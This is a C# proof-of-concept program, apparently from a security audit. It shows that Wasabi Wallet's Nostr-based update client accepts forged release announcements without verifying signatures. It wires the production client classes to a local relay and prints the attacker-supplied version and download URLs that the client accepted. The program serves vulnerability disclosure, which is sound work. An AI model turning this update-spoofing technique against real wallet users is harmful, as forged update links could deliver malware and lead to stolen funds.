using System.Net.WebSockets;
using WalletWasabi.WebClients;

// PoC for: Wasabi Wallet update announcements accepted with zero authenticity
// verification (pubkey / event id / Schnorr sig are never checked).
// This wires the REAL production classes (WalletWasabi.WebClients.WasabiNostrClient
// + CompositeNostrClient from the audited repo) against a malicious local relay.

class Program
{
    static async Task<int> Main()
    {
        var relayUri = new Uri("ws://127.0.0.1:7777");

        // Mirrors WalletWasabi.Client/Global.cs:508-523: build a composite client
        // over the (here: local, but functionally identical) relay set. The real
        // client passes a Tor-configured websocket; transport does not matter.
        void NoTor(WebSocket ws) { /* in production this routes via Tor SOCKS */ }

        using var cost = new CompositeNostrClient(new[] { relayUri }, NoTor);
        using var wasabiNostr = new WasabiNostrClient(cost);
        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(15));

        await wasabiNostr.ConnectAndSubscribeAsync(cts.Token);
        Console.WriteLine("[POC] connected+subscribed exactly like Global.cs does");

        // This is what UpdateManager.ProcessReleaseEventsAsync consumes:
        var reader = wasabiNostr.EventsReader;
        var got = await reader.ReadAsync(cts.Token);

        Console.WriteLine("[POC] WasabiNostrClient ACCEPTED the forged event:");
        Console.WriteLine($"      Version = {got.Version}");
        Console.WriteLine("      Download URLs supplied by attacker:");
        foreach (var kv in got.Assets)
            Console.WriteLine($"        {kv.Key,-30} -> {kv.Value}");

        Console.WriteLine();
        Console.WriteLine("[POC] VULNERABLE: a single relay injection puts an arbitrary");
        Console.WriteLine("      'new version' banner + attacker URLs into every Wasabi client.");
        return 0;
    }
}
